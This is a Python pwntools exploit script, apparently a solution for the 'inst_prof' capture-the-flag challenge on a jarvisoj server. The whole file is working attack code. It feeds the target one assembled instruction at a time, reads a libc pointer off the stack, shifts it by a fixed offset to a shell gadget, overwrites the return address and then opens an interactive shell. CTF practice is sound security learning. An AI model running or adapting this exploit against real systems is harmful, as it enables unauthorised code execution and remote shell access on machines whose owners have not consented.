#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import roputils as rp
import os
import sys

elfPath = "./inst_prof"
libcPath = ""
remoteAddr = "pwn2.jarvisoj.com"
remotePort = 9893

context.binary = elfPath
elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc
    offset = 0x4239e - 0x21a87

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)
    
    offset = 0x46428 - 0x21F45

#  context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    gdb.attach(io, cmd)

def execsc(sc):
    io.send(sc)
    #  io.recvuntil("\x00\x00\x00")

if __name__ == "__main__":
    execsc(asm("mov r14, rsp; ret"))

    add_r14 = asm("inc r14; ret")
    for i in xrange(0x40):
        execsc(add_r14)
    execsc(asm("mov r14, [r14]; ret"))

    #  DEBUG([0xB16, 0xB18], True)
    execsc(asm("add r14, {}".format(offset / 0x1000)))

    loop = offset - offset / 0x1000 * 0x1000
    print "loop for {:#x} times...".format(loop)
    pause()
    for i in xrange(loop):
        execsc(add_r14)

    #  DEBUG([0xB16, 0xB18], True)
    execsc(asm("mov [rsp], r14;"))

    io.interactive()


